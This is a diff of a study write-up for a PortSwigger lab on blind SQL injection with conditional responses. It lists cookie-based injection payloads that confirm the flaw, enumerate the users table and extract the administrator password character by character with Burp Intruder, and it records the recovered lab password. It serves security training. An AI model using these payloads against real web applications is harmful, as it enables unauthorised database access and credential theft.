@@ -1,11 +1,60 @@
 Lab 11 - Blind SQL Injection with conditional responses.
+https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses#
 
-Goal: Use the vulnerable cookie to retrieve the administartor username and password.
+Goal: Use the vulnerable cookie to retrieve the administrator username and password.
 
 Steps:
 ------
-1) Confirm that parameter is vulnerable to blind SQLi
-2)
+1) Confirm that parameter is vulnerable to blind SQLi using true and false cases (' and 1=1-- | ' and 1=0--)
+2) Confirm that we have a users table
+3) Confirm that administrator username exist in users table
+4) Enumerate the password of the administrator user
 
 Analysis:
 ---------
+1) Force a true vs false use case:
+    | select trackingId from tracking-table where trackingId = 'ZIfT7wWDeoC3PXrc' 
+        - If trackingId exist we get a "Welcome back!" message
+        - If trackingId does NOT EXIST we DO NOT get a "Welcome back!" message
+    - ' and 1=1-- e.g. TrackingId=ZIfT7wWDeoC3PXrc'+and+1%3d1-- (True Case) received the "Welcome back!" message
+    - ' and 1=2-- e.g. TrackingId=ZIfT7wWDeoC3PXrc'+and+1%3d2-- (False Case) didn't receive the "Welcome back!" message.
+
+2) Confirm that we have a users table:
+    | select trackingId from tracking-table where trackingId = 'ZIfT7wWDeoC3PXrc' and (select 'x' from users LIMIT 1) = 'x'--
+        e.g. TrackingId=ZIfT7wWDeoC3PXrc'+and+(select+'x'+from+users+LIMIT+1)+%3d+'x'--' -> (True Case) => Users table exist in database.
+
+3) Confirm that username administrator exist in users table:
+    | select trackingId from tracking-table where trackingId = 'ZIfT7wWDeoC3PXrc' and (select username from users where username='administrator') = 'administrator'--
+        e.g. TrackingId=ZIfT7wWDeoC3PXrc'+and+(select+username+from+users+where+username%3d'administrator')+%3d+'administrator'--
+
+4) Enumerate the password of the administrator user to get the length of password: (20)
+    | select trackingId from tracking-table where trackingId = 'ZIfT7wWDeoC3PXrc' and (select username from users where username ='administrator' and LENGTH(password)>1) = 'administrator'--
+        e.g. TrackingId=ZIfT7wWDeoC3PXrc'+and+(select+username+from+users+where+username+%3d'administrator'+and+LENGTH(password)>19)+%3d+'administrator'--
+    - Use Burp Suite Intruder
+        Burp Suite Steps to get password length
+            1) Send request to Intruder
+            2) Attack Type: Sniper
+            3) Select Position
+            4) Payload: Numbers
+                -Sequential
+                -From: 1
+                -To: 50
+                -Step: 1
+
+5) Enumerate the password of the administrator user to get the actual password: f08semh8qnhkaunktqd6
+    | select trackingId from tracking-table where trackingId = 'ZIfT7wWDeoC3PXrc' and (select substring(password,1,1) from users where username ='administrator') = 'a'--
+    - Use Burp Suite Intruder
+        Burp Suite Steps to get password
+            1) Send request to Intruder
+            2) Attack Type: Cluster bomb
+            3) Select Payloads 
+                - select substring(password,$1$,1)
+                    * Payload Type: Numbers
+                    * Type: Sequential
+                    * From: 1
+                    * To: 20
+                - ='administrator') = '$a$'--
+                    * Payload Type: Brute Forcer
+                    * Character set: abcdefghijklmnopqrstuvwxyz0123456789
+                    * Min length: 1
+                    * Max length: 1
